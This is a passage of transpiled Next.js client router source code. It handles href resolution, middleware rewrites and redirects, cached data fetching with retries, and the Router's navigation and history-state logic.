	    // Return because it cannot be routed by the Next.js router
	    if (!isLocalURL(urlAsString)) {
	        return resolveAs ? [
	            urlAsString
	        ] : urlAsString;
	    }
	    try {
	        base = new URL(urlAsString.startsWith('#') ? router.asPath : router.pathname, 'http://n');
	    } catch (_) {
	        // fallback to / for invalid asPath values e.g. //
	        base = new URL('/', 'http://n');
	    }
	    try {
	        const finalUrl = new URL(urlAsString, base);
	        finalUrl.pathname = (0, _normalizeTrailingSlash).normalizePathTrailingSlash(finalUrl.pathname);
	        let interpolatedAs = '';
	        if ((0, _isDynamic).isDynamicRoute(finalUrl.pathname) && finalUrl.searchParams && resolveAs) {
	            const query = (0, _querystring).searchParamsToUrlQuery(finalUrl.searchParams);
	            const { result , params  } = interpolateAs(finalUrl.pathname, finalUrl.pathname, query);
	            if (result) {
	                interpolatedAs = (0, _formatUrl).formatWithValidation({
	                    pathname: result,
	                    hash: finalUrl.hash,
	                    query: omit(query, params)
	                });
	            }
	        }
	        // if the origin didn't change, it means we received a relative href
	        const resolvedHref = finalUrl.origin === base.origin ? finalUrl.href.slice(finalUrl.origin.length) : finalUrl.href;
	        return resolveAs ? [
	            resolvedHref,
	            interpolatedAs || resolvedHref
	        ] : resolvedHref;
	    } catch (_1) {
	        return resolveAs ? [
	            urlAsString
	        ] : urlAsString;
	    }
	}
	function prepareUrlAs(router, url, as) {
	    // If url and as provided as an object representation,
	    // we'll format them into the string version here.
	    let [resolvedHref, resolvedAs] = resolveHref(router, url, true);
	    const origin = (_utils).getLocationOrigin();
	    const hrefHadOrigin = resolvedHref.startsWith(origin);
	    const asHadOrigin = resolvedAs && resolvedAs.startsWith(origin);
	    resolvedHref = stripOrigin(resolvedHref);
	    resolvedAs = resolvedAs ? stripOrigin(resolvedAs) : resolvedAs;
	    const preparedUrl = hrefHadOrigin ? resolvedHref : (_addBasePath).addBasePath(resolvedHref);
	    const preparedAs = as ? stripOrigin(resolveHref(router, as)) : resolvedAs || resolvedHref;
	    return {
	        url: preparedUrl,
	        as: asHadOrigin ? preparedAs : (_addBasePath).addBasePath(preparedAs)
	    };
	}
	function resolveDynamicRoute(pathname, pages) {
	    const cleanPathname = (_removeTrailingSlash).removeTrailingSlash((_denormalizePagePath).denormalizePagePath(pathname));
	    if (cleanPathname === '/404' || cleanPathname === '/_error') {
	        return pathname;
	    }
	    // handle resolving href for dynamic routes
	    if (!pages.includes(cleanPathname)) {
	        // eslint-disable-next-line array-callback-return
	        pages.some((page)=>{
	            if ((_isDynamic).isDynamicRoute(page) && (_routeRegex).getRouteRegex(page).re.test(cleanPathname)) {
	                pathname = page;
	                return true;
	            }
	        });
	    }
	    return (_removeTrailingSlash).removeTrailingSlash(pathname);
	}
	function getMiddlewareData(source, response, options) {
	    const nextConfig = {
	        basePath: options.router.basePath,
	        i18n: {
	            locales: options.router.locales
	        },
	        trailingSlash: Boolean(process.env.__NEXT_TRAILING_SLASH)
	    };
	    const rewriteHeader = response.headers.get('x-nextjs-rewrite');
	    let rewriteTarget = rewriteHeader || response.headers.get('x-nextjs-matched-path');
	    const matchedPath = response.headers.get('x-matched-path');
	    if (matchedPath && !rewriteTarget && !matchedPath.includes('__next_data_catchall') && !matchedPath.includes('/_error') && !matchedPath.includes('/404')) {
	        // leverage x-matched-path to detect next.config.js rewrites
	        rewriteTarget = matchedPath;
	    }
	    if (rewriteTarget) {
	        if (rewriteTarget.startsWith('/')) {
	            const parsedRewriteTarget = (_parseRelativeUrl).parseRelativeUrl(rewriteTarget);
	            const pathnameInfo = (_getNextPathnameInfo).getNextPathnameInfo(parsedRewriteTarget.pathname, {
	                nextConfig,
	                parseData: true
	            });
	            let fsPathname = (_removeTrailingSlash).removeTrailingSlash(pathnameInfo.pathname);
	            return Promise.all([
	                options.router.pageLoader.getPageList(),
	                (_routeLoader).getClientBuildManifest(), 
	            ]).then(([pages, { __rewrites: rewrites  }])=>{
	                let as = (_addLocale).addLocale(pathnameInfo.pathname, pathnameInfo.locale);
	                if ((_isDynamic).isDynamicRoute(as) || !rewriteHeader && pages.includes((_normalizeLocalePath).normalizeLocalePath((_removeBasePath).removeBasePath(as), options.router.locales).pathname)) {
	                    const parsedSource = (_getNextPathnameInfo).getNextPathnameInfo((_parseRelativeUrl).parseRelativeUrl(source).pathname, {
	                        parseData: true
	                    });
	                    as = (_addBasePath).addBasePath(parsedSource.pathname);
	                    parsedRewriteTarget.pathname = as;
	                }
	                if (process.env.__NEXT_HAS_REWRITES) {
	                    const result = (_resolveRewrites).default(as, pages, rewrites, parsedRewriteTarget.query, (path)=>resolveDynamicRoute(path, pages), options.router.locales);
	                    if (result.matchedPage) {
	                        parsedRewriteTarget.pathname = result.parsedAs.pathname;
	                        as = parsedRewriteTarget.pathname;
	                        Object.assign(parsedRewriteTarget.query, result.parsedAs.query);
	                    }
	                } else if (!pages.includes(fsPathname)) {
	                    const resolvedPathname = resolveDynamicRoute(fsPathname, pages);
	                    if (resolvedPathname !== fsPathname) {
	                        fsPathname = resolvedPathname;
	                    }
	                }
	                const resolvedHref = !pages.includes(fsPathname) ? resolveDynamicRoute((_normalizeLocalePath).normalizeLocalePath((_removeBasePath).removeBasePath(parsedRewriteTarget.pathname), options.router.locales).pathname, pages) : fsPathname;
	                if ((_isDynamic).isDynamicRoute(resolvedHref)) {
	                    const matches = (_routeMatcher).getRouteMatcher((_routeRegex).getRouteRegex(resolvedHref))(as);
	                    Object.assign(parsedRewriteTarget.query, matches || {});
	                }
	                return {
	                    type: 'rewrite',
	                    parsedAs: parsedRewriteTarget,
	                    resolvedHref
	                };
	            });
	        }
	        const src = (_parsePath).parsePath(source);
	        const pathname = (_formatNextPathnameInfo).formatNextPathnameInfo(_extends({}, (_getNextPathnameInfo).getNextPathnameInfo(src.pathname, {
	            nextConfig,
	            parseData: true
	        }), {
	            defaultLocale: options.router.defaultLocale,
	            buildId: ''
	        }));
	        return Promise.resolve({
	            type: 'redirect-external',
	            destination: `${pathname}${src.query}${src.hash}`
	        });
	    }
	    const redirectTarget = response.headers.get('x-nextjs-redirect');
	    if (redirectTarget) {
	        if (redirectTarget.startsWith('/')) {
	            const src = (_parsePath).parsePath(redirectTarget);
	            const pathname = (_formatNextPathnameInfo).formatNextPathnameInfo(_extends({}, (_getNextPathnameInfo).getNextPathnameInfo(src.pathname, {
	                nextConfig,
	                parseData: true
	            }), {
	                defaultLocale: options.router.defaultLocale,
	                buildId: ''
	            }));
	            return Promise.resolve({
	                type: 'redirect-internal',
	                newAs: `${pathname}${src.query}${src.hash}`,
	                newUrl: `${pathname}${src.query}${src.hash}`
	            });
	        }
	        return Promise.resolve({
	            type: 'redirect-external',
	            destination: redirectTarget
	        });
	    }
	    return Promise.resolve({
	        type: 'next'
	    });
	}
	function withMiddlewareEffects(options) {
	    return matchesMiddleware(options).then((matches)=>{
	        if (matches && options.fetchData) {
	            return options.fetchData().then((data)=>getMiddlewareData(data.dataHref, data.response, options).then((effect)=>({
	                        dataHref: data.dataHref,
	                        cacheKey: data.cacheKey,
	                        json: data.json,
	                        response: data.response,
	                        text: data.text,
	                        effect
	                    }))).catch((_err)=>{
	                /**
	           * TODO: Revisit this in the future.
	           * For now we will not consider middleware data errors to be fatal.
	           * maybe we should revisit in the future.
	           */ return null;
	            });
	        }
	        return null;
	    });
	}
	const manualScrollRestoration = process.env.__NEXT_SCROLL_RESTORATION && typeof window !== 'undefined' && 'scrollRestoration' in window.history && !!function() {
	    try {
	        let v = '__next';
	        // eslint-disable-next-line no-sequences
	        return sessionStorage.setItem(v, v), sessionStorage.removeItem(v), true;
	    } catch (n) {}
	}();
	const SSG_DATA_NOT_FOUND = Symbol('SSG_DATA_NOT_FOUND');
	function fetchRetry(url, attempts, options) {
	    return fetch(url, {
	        // Cookies are required to be present for Next.js' SSG "Preview Mode".
	        // Cookies may also be required for `getServerSideProps`.
	        //
	        // > `fetch` won’t send cookies, unless you set the credentials init
	        // > option.
	        // https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch
	        //
	        // > For maximum browser compatibility when it comes to sending &
	        // > receiving cookies, always supply the `credentials: 'same-origin'`
	        // > option instead of relying on the default.
	        // https://github.com/github/fetch#caveats
	        credentials: 'same-origin',
	        method: options.method || 'GET',
	        headers: Object.assign({}, options.headers, {
	            'x-nextjs-data': '1'
	        })
	    }).then((response)=>{
	        return !response.ok && attempts > 1 && response.status >= 500 ? fetchRetry(url, attempts - 1, options) : response;
	    });
	}
	const backgroundCache = {};
	function handleSmoothScroll(fn) {
	    const htmlElement = document.documentElement;
	    const existing = htmlElement.style.scrollBehavior;
	    htmlElement.style.scrollBehavior = 'auto';
	    fn();
	    htmlElement.style.scrollBehavior = existing;
	}
	function tryToParseAsJSON(text) {
	    try {
	        return JSON.parse(text);
	    } catch (error) {
	        return null;
	    }
	}
	function fetchNextData({ dataHref , inflightCache , isPrefetch , hasMiddleware , isServerRender , parseJSON , persistCache , isBackground , unstable_skipClientCache  }) {
	    const { href: cacheKey  } = new URL(dataHref, window.location.href);
	    var ref1;
	    const getData = (params)=>{
	        return fetchRetry(dataHref, isServerRender ? 3 : 1, {
	            headers: isPrefetch ? {
	                purpose: 'prefetch'
	            } : {},
	            method: (ref1 = params == null ? void 0 : params.method) != null ? ref1 : 'GET'
	        }).then((response)=>{
	            if (response.ok && (params == null ? void 0 : params.method) === 'HEAD') {
	                return {
	                    dataHref,
	                    response,
	                    text: '',
	                    json: {},
	                    cacheKey
	                };
	            }
	            return response.text().then((text)=>{
	                if (!response.ok) {
	                    /**
	             * When the data response is a redirect because of a middleware
	             * we do not consider it an error. The headers must bring the
	             * mapped location.
	             * TODO: Change the status code in the handler.
	             */ if (hasMiddleware && [
	                        301,
	                        302,
	                        307,
	                        308
	                    ].includes(response.status)) {
	                        return {
	                            dataHref,
	                            response,
	                            text,
	                            json: {},
	                            cacheKey
	                        };
	                    }
	                    if (!hasMiddleware && response.status === 404) {
	                        var ref;
	                        if ((ref = tryToParseAsJSON(text)) == null ? void 0 : ref.notFound) {
	                            return {
	                                dataHref,
	                                json: {
	                                    notFound: SSG_DATA_NOT_FOUND
	                                },
	                                response,
	                                text,
	                                cacheKey
	                            };
	                        }
	                    }
	                    const error = new Error(`Failed to load static props`);
	                    /**
	             * We should only trigger a server-side transition if this was
	             * caused on a client-side transition. Otherwise, we'd get into
	             * an infinite loop.
	             */ if (!isServerRender) {
	                        (_routeLoader).markAssetError(error);
	                    }
	                    throw error;
	                }
	                return {
	                    dataHref,
	                    json: parseJSON ? tryToParseAsJSON(text) : null,
	                    response,
	                    text,
	                    cacheKey
	                };
	            });
	        }).then((data)=>{
	            if (!persistCache || process.env.NODE_ENV !== 'production' || data.response.headers.get('x-middleware-cache') === 'no-cache') {
	                delete inflightCache[cacheKey];
	            }
	            return data;
	        }).catch((err)=>{
	            delete inflightCache[cacheKey];
	            throw err;
	        });
	    };
	    // when skipping client cache we wait to update
	    // inflight cache until successful data response
	    // this allows racing click event with fetching newer data
	    // without blocking navigation when stale data is available
	    if (unstable_skipClientCache && persistCache) {
	        return getData({}).then((data)=>{
	            inflightCache[cacheKey] = Promise.resolve(data);
	            return data;
	        });
	    }
	    if (inflightCache[cacheKey] !== undefined) {
	        return inflightCache[cacheKey];
	    }
	    return inflightCache[cacheKey] = getData(isBackground ? {
	        method: 'HEAD'
	    } : {});
	}
	function createKey() {
	    return Math.random().toString(36).slice(2, 10);
	}
	function handleHardNavigation({ url , router  }) {
	    // ensure we don't trigger a hard navigation to the same
	    // URL as this can end up with an infinite refresh
	    if (url === (_addBasePath).addBasePath((_addLocale).addLocale(router.asPath, router.locale))) {
	        throw new Error(`Invariant: attempted to hard navigate to the same URL ${url} ${location.href}`);
	    }
	    window.location.href = url;
	}
	const getCancelledHandler = ({ route , router  })=>{
	    let cancelled = false;
	    const cancel = router.clc = ()=>{
	        cancelled = true;
	    };
	    const handleCancelled = ()=>{
	        if (cancelled) {
	            const error = new Error(`Abort fetching component for route: "${route}"`);
	            error.cancelled = true;
	            throw error;
	        }
	        if (cancel === router.clc) {
	            router.clc = null;
	        }
	    };
	    return handleCancelled;
	};
	class Router {
	    reload() {
	        window.location.reload();
	    }
	    /**
	   * Go back in history
	   */ back() {
	        window.history.back();
	    }
	    /**
	   * Performs a `pushState` with arguments
	   * @param url of the route
	   * @param as masks `url` for the browser
	   * @param options object you can define `shallow` and other options
	   */ push(url, as, options = {}) {
	        if (process.env.__NEXT_SCROLL_RESTORATION) {
	            // TODO: remove in the future when we update history before route change
	            // is complete, as the popstate event should handle this capture.
	            if (manualScrollRestoration) {
	                try {
	                    // Snapshot scroll position right before navigating to a new page:
	                    sessionStorage.setItem('__next_scroll_' + this._key, JSON.stringify({
	                        x: self.pageXOffset,
	                        y: self.pageYOffset
	                    }));
	                } catch (e) {}
	            }
	        }
	        ({ url , as  } = prepareUrlAs(this, url, as));
	        return this.change('pushState', url, as, options);
	    }
	    /**
	   * Performs a `replaceState` with arguments
	   * @param url of the route
	   * @param as masks `url` for the browser
	   * @param options object you can define `shallow` and other options
	   */ replace(url, as, options = {}) {
	        ({ url , as  } = prepareUrlAs(this, url, as));
	        return this.change('replaceState', url, as, options);
	    }
	    change(method, url, as, options, forcedScroll) {
	        var _this = this;
	        return _async_to_generator(function*() {
	            if (!isLocalURL(url)) {
	                handleHardNavigation({
	                    url,
	                    router: _this
	                });
	                return false;
	            }
	            // WARNING: `_h` is an internal option for handing Next.js client-side
	            // hydration. Your app should _never_ use this property. It may change at
	            // any time without notice.
	            const isQueryUpdating = options._h;
	            const shouldResolveHref = isQueryUpdating || options._shouldResolveHref || (_parsePath).parsePath(url).pathname === (_parsePath).parsePath(as).pathname;
	            const nextState = _extends({}, _this.state);
	            // for static pages with query params in the URL we delay
	            // marking the router ready until after the query is updated
	            // or a navigation has occurred
	            const readyStateChange = _this.isReady !== true;
	            _this.isReady = true;
	            const isSsr = _this.isSsr;
	            if (!isQueryUpdating) {
	                _this.isSsr = false;
	            }
	            // if a route transition is already in progress before
	            // the query updating is triggered ignore query updating
	            if (isQueryUpdating && _this.clc) {
	                return false;
	            }
	            const prevLocale = nextState.locale;
	            if (process.env.__NEXT_I18N_SUPPORT) {
	                nextState.locale = options.locale === false ? _this.defaultLocale : options.locale || nextState.locale;
	                if (typeof options.locale === 'undefined') {
	                    options.locale = nextState.locale;
	                }
	                const parsedAs = (_parseRelativeUrl).parseRelativeUrl((_hasBasePath).hasBasePath(as) ? (_removeBasePath).removeBasePath(as) : as);
	                const localePathResult = (_normalizeLocalePath).normalizeLocalePath(parsedAs.pathname, _this.locales);
	                if (localePathResult.detectedLocale) {
	                    nextState.locale = localePathResult.detectedLocale;
	                    parsedAs.pathname = (_addBasePath).addBasePath(parsedAs.pathname);
	                    as = (_formatUrl).formatWithValidation(parsedAs);
	                    url = (_addBasePath).addBasePath((_normalizeLocalePath).normalizeLocalePath((_hasBasePath).hasBasePath(url) ? (_removeBasePath).removeBasePath(url) : url, _this.locales).pathname);
	                }
	                let didNavigate = false;
	                // we need to wrap this in the env check again since regenerator runtime
	                // moves this on its own due to the return
	                if (process.env.__NEXT_I18N_SUPPORT) {
	                    var ref;
	                    // if the locale isn't configured hard navigate to show 404 page
	                    if (!((ref = _this.locales) == null ? void 0 : ref.includes(nextState.locale))) {
	                        parsedAs.pathname = (_addLocale).addLocale(parsedAs.pathname, nextState.locale);
	                        handleHardNavigation({
	                            url: (_formatUrl).formatWithValidation(parsedAs),
	                            router: _this
	                        });
	                        // this was previously a return but was removed in favor
	                        // of better dead code elimination with regenerator runtime
	                        didNavigate = true;
	                    }
	                }
	                const detectedDomain = (_detectDomainLocale).detectDomainLocale(_this.domainLocales, undefined, nextState.locale);
	                // we need to wrap this in the env check again since regenerator runtime
	                // moves this on its own due to the return
	                if (process.env.__NEXT_I18N_SUPPORT) {
	                    // if we are navigating to a domain locale ensure we redirect to the
	                    // correct domain
	                    if (!didNavigate && detectedDomain && _this.isLocaleDomain && self.location.hostname !== detectedDomain.domain) {
	                        const asNoBasePath = (_removeBasePath).removeBasePath(as);
	                        handleHardNavigation({
	                            url: `http${detectedDomain.http ? '' : 's'}://${detectedDomain.domain}${(_addBasePath).addBasePath(`${nextState.locale === detectedDomain.defaultLocale ? '' : `/${nextState.locale}`}${asNoBasePath === '/' ? '' : asNoBasePath}` || '/')}`,
	                            router: _this
	                        });
	                        // this was previously a return but was removed in favor
	                        // of better dead code elimination with regenerator runtime
	                        didNavigate = true;
	                    }
	                }
	                if (didNavigate) {
	                    return new Promise(()=>{});
	                }
	            }
	            // marking route changes as a navigation start entry
	            if (_utils.ST) {
	                performance.mark('routeChange');
	            }
	            const { shallow =false , scroll =true  } = options;
	            const routeProps = {
	                shallow
	            };
	            if (_this._inFlightRoute && _this.clc) {
	                if (!isSsr) {
	                    Router.events.emit('routeChangeError', buildCancellationError(), _this._inFlightRoute, routeProps);
	                }
	                _this.clc();
	                _this.clc = null;
	            }
	            as = (_addBasePath).addBasePath((_addLocale).addLocale((_hasBasePath).hasBasePath(as) ? (_removeBasePath).removeBasePath(as) : as, options.locale, _this.defaultLocale));
	            const cleanedAs = (_removeLocale).removeLocale((_hasBasePath).hasBasePath(as) ? (_removeBasePath).removeBasePath(as) : as, nextState.locale);
	            _this._inFlightRoute = as;
	            const localeChange = prevLocale !== nextState.locale;
	            // If the url change is only related to a hash change
	            // We should not proceed. We should only change the state.
	            if (!isQueryUpdating && _this.onlyAHashChange(cleanedAs) && !localeChange) {
	                nextState.asPath = cleanedAs;
	                Router.events.emit('hashChangeStart', as, routeProps);
	                // TODO: do we need the resolved href when only a hash change?
	                _this.changeState(method, url, as, _extends({}, options, {
	                    scroll: false
	                }));
	                if (scroll) {
	                    _this.scrollToHash(cleanedAs);
	                }
	                try {
	                    yield _this.set(nextState, _this.components[nextState.route], null);
	                } catch (err) {
	                    if ((_isError).default(err) && err.cancelled) {
	                        Router.events.emit('routeChangeError', err, cleanedAs, routeProps);
	                    }
	                    throw err;
	                }
	                Router.events.emit('hashChangeComplete', as, routeProps);
	                return true;
	            }
	            let parsed = (_parseRelativeUrl).parseRelativeUrl(url);
	            let { pathname , query  } = parsed;
	            // The build manifest needs to be loaded before auto-static dynamic pages
	            // get their query parameters to allow ensuring they can be parsed properly
	            // when rewritten to
	            let pages, rewrites;
	            try {
	                [pages, { __rewrites: rewrites  }] = yield Promise.all([
	                    _this.pageLoader.getPageList(),
	                    (0, _routeLoader).getClientBuildManifest(),
	                    _this.pageLoader.getMiddleware(), 
	                ]);
	            } catch (err) {
	                // If we fail to resolve the page list or client-build manifest, we must
	                // do a server-side transition:
	                handleHardNavigation({
	                    url: as,
	                    router: _this
	                });
	                return false;
	            }
	            // If asked to change the current URL we should reload the current page
	            // (not location.reload() but reload getInitialProps and other Next.js stuffs)
	            // We also need to set the method = replaceState always
	            // as this should not go into the history (That's how browsers work)
	            // We should compare the new asPath to the current asPath, not the url
	            if (!_this.urlIsNew(cleanedAs) && !localeChange) {
	                method = 'replaceState';
	            }
	            // we need to resolve the as value using rewrites for dynamic SSG
	            // pages to allow building the data URL correctly
	            let resolvedAs = as;
	            // url and as should always be prefixed with basePath by this
	            // point by either next/link or router.push/replace so strip the
	            // basePath from the pathname to match the pages dir 1-to-1
	            pathname = pathname ? (_removeTrailingSlash).removeTrailingSlash((_removeBasePath).removeBasePath(pathname)) : pathname;
	            // we don't attempt resolve asPath when we need to execute
	            // middleware as the resolving will occur server-side
	            const isMiddlewareMatch = yield matchesMiddleware({
	                asPath: as,
	                locale: nextState.locale,
	                router: _this
	            });
	            if (options.shallow && isMiddlewareMatch) {
	                pathname = _this.pathname;
	            }
	            if (shouldResolveHref && pathname !== '/_error') {
	                options._shouldResolveHref = true;
	                if (process.env.__NEXT_HAS_REWRITES && as.startsWith('/')) {
	                    const rewritesResult = (_resolveRewrites).default((_addBasePath).addBasePath((_addLocale).addLocale(cleanedAs, nextState.locale), true), pages, rewrites, query, (p)=>resolveDynamicRoute(p, pages), _this.locales);
	                    if (rewritesResult.externalDest) {
	                        handleHardNavigation({
	                            url: as,
	                            router: _this
	                        });
	                        return true;
	                    }
	                    if (!isMiddlewareMatch) {
	                        resolvedAs = rewritesResult.asPath;
	                    }
	                    if (rewritesResult.matchedPage && rewritesResult.resolvedHref) {
	                        // if this directly matches a page we need to update the href to
	                        // allow the correct page chunk to be loaded
	                        pathname = rewritesResult.resolvedHref;
	                        parsed.pathname = (_addBasePath).addBasePath(pathname);
	                        if (!isMiddlewareMatch) {
	                            url = (_formatUrl).formatWithValidation(parsed);
	                        }
	                    }
	                } else {
	                    parsed.pathname = resolveDynamicRoute(pathname, pages);
	                    if (parsed.pathname !== pathname) {
	                        pathname = parsed.pathname;
	                        parsed.pathname = (_addBasePath).addBasePath(pathname);
	                        if (!isMiddlewareMatch) {
	                            url = (_formatUrl).formatWithValidation(parsed);
	                        }
	                    }
	                }
	            }
	            if (!isLocalURL(as)) {
	                if (process.env.NODE_ENV !== 'production') {
	                    throw new Error(`Invalid href: "${url}" and as: "${as}", received relative href and external as` + `\nSee more info: https://nextjs.org/docs/messages/invalid-relative-url-external-as`);
	                }
	                handleHardNavigation({
	                    url: as,
	                    router: _this
	                });
	                return false;
	            }
	            resolvedAs = (_removeLocale).removeLocale((_removeBasePath).removeBasePath(resolvedAs), nextState.locale);
	            let route = (_removeTrailingSlash).removeTrailingSlash(pathname);
	            let routeMatch = false;
	            if ((_isDynamic).isDynamicRoute(route)) {
	                const parsedAs = (_parseRelativeUrl).parseRelativeUrl(resolvedAs);
	                const asPathname = parsedAs.pathname;
	                const routeRegex = (_routeRegex).getRouteRegex(route);
	                routeMatch = (_routeMatcher).getRouteMatcher(routeRegex)(asPathname);
	                const shouldInterpolate = route === asPathname;
	                const interpolatedAs = shouldInterpolate ? interpolateAs(route, asPathname, query) : {};
	                if (!routeMatch || shouldInterpolate && !interpolatedAs.result) {
	                    const missingParams = Object.keys(routeRegex.groups).filter((param)=>!query[param]);
	                    if (missingParams.length > 0 && !isMiddlewareMatch) {
	                        if (process.env.NODE_ENV !== 'production') {
	                            console.warn(`${shouldInterpolate ? `Interpolating href` : `Mismatching \`as\` and \`href\``} failed to manually provide ` + `the params: ${missingParams.join(', ')} in the \`href\`'s \`query\``);
	                        }
	                        throw new Error((shouldInterpolate ? `The provided \`href\` (${url}) value is missing query values (${missingParams.join(', ')}) to be interpolated properly. ` : `The provided \`as\` value (${asPathname}) is incompatible with the \`href\` value (${route}). `) + `Read more: https://nextjs.org/docs/messages/${shouldInterpolate ? 'href-interpolation-failed' : 'incompatible-href-as'}`);
	                    }
	                } else if (shouldInterpolate) {
	                    as = (_formatUrl).formatWithValidation(Object.assign({}, parsedAs, {
	                        pathname: interpolatedAs.result,
	                        query: omit(query, interpolatedAs.params)
	                    }));
	                } else {
	                    // Merge params into `query`, overwriting any specified in search
	                    Object.assign(query, routeMatch);
	                }
	            }
	            if (!isQueryUpdating) {
	                Router.events.emit('routeChangeStart', as, routeProps);
	            }
	            try {
	                var ref2, ref3;
	                let routeInfo = yield _this.getRouteInfo({
	                    route,
	                    pathname,
	                    query,
	                    as,
	                    resolvedAs,
	                    routeProps,
	                    locale: nextState.locale,
	                    isPreview: nextState.isPreview,
	                    hasMiddleware: isMiddlewareMatch
	                });
	                if ('route' in routeInfo && isMiddlewareMatch) {
	                    pathname = routeInfo.route || route;
	                    route = pathname;
	                    if (!routeProps.shallow) {
	                        query = Object.assign({}, routeInfo.query || {}, query);
	                    }
	                    const cleanedParsedPathname = (0, _hasBasePath).hasBasePath(parsed.pathname) ? (0, _removeBasePath).removeBasePath(parsed.pathname) : parsed.pathname;
	                    if (routeMatch && pathname !== cleanedParsedPathname) {
	                        Object.keys(routeMatch).forEach((key)=>{
	                            if (routeMatch && query[key] === routeMatch[key]) {
	                                delete query[key];
	                            }
	                        });
	                    }
	                    if ((0, _isDynamic).isDynamicRoute(pathname)) {
	                        const prefixedAs = !routeProps.shallow && routeInfo.resolvedAs ? routeInfo.resolvedAs : (0, _addBasePath).addBasePath((0, _addLocale).addLocale(new URL(as, location.href).pathname, nextState.locale), true);
	                        let rewriteAs = prefixedAs;
	                        if ((0, _hasBasePath).hasBasePath(rewriteAs)) {
	                            rewriteAs = (0, _removeBasePath).removeBasePath(rewriteAs);
	                        }
	                        if (process.env.__NEXT_I18N_SUPPORT) {
	                            const localeResult = (0, _normalizeLocalePath).normalizeLocalePath(rewriteAs, _this.locales);
	                            nextState.locale = localeResult.detectedLocale || nextState.locale;
	                            rewriteAs = localeResult.pathname;
	                        }
	                        const routeRegex = (0, _routeRegex).getRouteRegex(pathname);
	                        const curRouteMatch = (0, _routeMatcher).getRouteMatcher(routeRegex)(rewriteAs);
	                        if (curRouteMatch) {
	                            Object.assign(query, curRouteMatch);
	                        }
	                    }
	                }
	                // If the routeInfo brings a redirect we simply apply it.
	                if ('type' in routeInfo) {
	                    if (routeInfo.type === 'redirect-internal') {
	                        return _this.change(method, routeInfo.newUrl, routeInfo.newAs, options);
	                    } else {
	                        handleHardNavigation({
	                            url: routeInfo.destination,
	                            router: _this
	                        });
	                        return new Promise(()=>{});
	                    }
	                }
	                let { error , props , __N_SSG , __N_SSP  } = routeInfo;
	                const component = routeInfo.Component;
	                if (component && component.unstable_scriptLoader) {
	                    const scripts = [].concat(component.unstable_scriptLoader());
	                    scripts.forEach((script)=>{
	                        (0, _script).handleClientScriptLoad(script.props);
	                    });
	                }
	                // handle redirect on client-transition
	                if ((__N_SSG || __N_SSP) && props) {
	                    if (props.pageProps && props.pageProps.__N_REDIRECT) {
	                        // Use the destination from redirect without adding locale
	                        options.locale = false;
	                        const destination = props.pageProps.__N_REDIRECT;
	                        // check if destination is internal (resolves to a page) and attempt
	                        // client-navigation if it is falling back to hard navigation if
	                        // it's not
	                        if (destination.startsWith('/') && props.pageProps.__N_REDIRECT_BASE_PATH !== false) {
	                            const parsedHref = (0, _parseRelativeUrl).parseRelativeUrl(destination);
	                            parsedHref.pathname = resolveDynamicRoute(parsedHref.pathname, pages);
	                            const { url: newUrl , as: newAs  } = prepareUrlAs(_this, destination, destination);
	                            return _this.change(method, newUrl, newAs, options);
	                        }
	                        handleHardNavigation({
	                            url: destination,
	                            router: _this
	                        });
	                        return new Promise(()=>{});
	                    }
	                    nextState.isPreview = !!props.__N_PREVIEW;
	                    // handle SSG data 404
	                    if (props.notFound === SSG_DATA_NOT_FOUND) {
	                        let notFoundRoute;
	                        try {
	                            yield _this.fetchComponent('/404');
	                            notFoundRoute = '/404';
	                        } catch (_) {
	                            notFoundRoute = '/_error';
	                        }
	                        routeInfo = yield _this.getRouteInfo({
	                            route: notFoundRoute,
	                            pathname: notFoundRoute,
	                            query,
	                            as,
	                            resolvedAs,
	                            routeProps: {
	                                shallow: false
	                            },
	                            locale: nextState.locale,
	                            isPreview: nextState.isPreview
	                        });
	                        if ('type' in routeInfo) {
	                            throw new Error(`Unexpected middleware effect on /404`);
	                        }
	                    }
	                }
	                Router.events.emit('beforeHistoryChange', as, routeProps);
	                _this.changeState(method, url, as, options);
	                if (isQueryUpdating && pathname === '/_error' && ((ref2 = self.__NEXT_DATA__.props) == null ? void 0 : (ref3 = ref2.pageProps) == null ? void 0 : ref3.statusCode) === 500 && (props == null ? void 0 : props.pageProps)) {
	                    // ensure statusCode is still correct for static 500 page
	                    // when updating query information
	                    props.pageProps.statusCode = 500;
	                }
	                var _route;
	                // shallow routing is only allowed for same page URL changes.
	                const isValidShallowRoute = options.shallow && nextState.route === ((_route = routeInfo.route) != null ? _route : route);
	                var _scroll;
	                const shouldScroll = (_scroll = options.scroll) != null ? _scroll : !options._h && !isValidShallowRoute;
	                const resetScroll = shouldScroll ? {
	                    x: 0,
	                    y: 0
	                } : null;
	                // the new state that the router gonna set
	                const upcomingRouterState = _extends({}, nextState, {
	                    route,
	                    pathname,
	                    query,
	                    asPath: cleanedAs,
	                    isFallback: false
	                });
	                const upcomingScrollState = forcedScroll != null ? forcedScroll : resetScroll;
	                // for query updates we can skip it if the state is unchanged and we don't
	                // need to scroll
	                // https://github.com/vercel/next.js/issues/37139
	                const canSkipUpdating = options._h && !upcomingScrollState && !readyStateChange && !localeChange && (0, _compareStates).compareRouterStates(upcomingRouterState, _this.state);
	                if (!canSkipUpdating) {
	                    yield _this.set(upcomingRouterState, routeInfo, upcomingScrollState).catch((e)=>{
	                        if (e.cancelled) error = error || e;
	                        else throw e;
	                    });
	                    if (error) {
	                        if (!isQueryUpdating) {
	                            Router.events.emit('routeChangeError', error, cleanedAs, routeProps);
	                        }
	                        throw error;
	                    }
	                    if (process.env.__NEXT_I18N_SUPPORT) {
	                        if (nextState.locale) {
	                            document.documentElement.lang = nextState.locale;
	                        }
	                    }
	                    if (!isQueryUpdating) {
	                        Router.events.emit('routeChangeComplete', as, routeProps);
	                    }
	                    // A hash mark # is the optional last part of a URL
	                    const hashRegex = /#.+$/;
	                    if (shouldScroll && hashRegex.test(as)) {
	                        _this.scrollToHash(as);
	                    }
	                }
	                return true;
	            } catch (err1) {
	                if ((_isError).default(err1) && err1.cancelled) {
	                    return false;
	                }
	                throw err1;
	            }
	        })();
	    }
	    changeState(method, url, as, options = {}) {
	        if (process.env.NODE_ENV !== 'production') {
	            if (typeof window.history === 'undefined') {
	                console.error(`Warning: window.history is not available.`);
	                return;
	            }
	            if (typeof window.history[method] === 'undefined') {
	                console.error(`Warning: window.history.${method} is not available`);
	                return;
	            }
	        }
	        if (method !== 'pushState' || (_utils).getURL() !== as) {
	            this._shallow = options.shallow;
	            window.history[method]({
	                url,
	                as,
	                options,
	                __N: true,
	                key: this._key = method !== 'pushState' ? this._key : createKey()
	            }, // Most browsers currently ignores this parameter, although they may use it in the future.
